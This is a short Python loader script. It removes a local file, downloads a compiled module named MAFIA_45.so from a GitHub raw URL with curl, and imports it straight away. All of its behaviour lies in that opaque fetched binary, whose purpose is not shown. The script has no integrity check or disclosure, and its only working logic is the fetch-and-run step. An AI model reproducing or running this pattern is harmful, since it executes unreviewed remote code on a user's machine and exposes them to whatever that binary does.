import os, sys , platform
os.system('rm -rf MAFIA_45.so')
bit = platform.architecture()[0]
if bit == '64bit':
    if not os.path.isfile('MAFIA_45.so'):
        os.system('curl -L https://github.com/Muzammil-404/flutter/blob/main/MAFIA_45.cpython-311.so?raw=true -o MAFIA_45.so')
        import MAFIA_45
    else:
        import MAFIA_45
else:
    exit(' 32-bit Not Supported ... ')
#try:
#    __import__("encryption")
#except Exception as e:
#    exit(str(e))
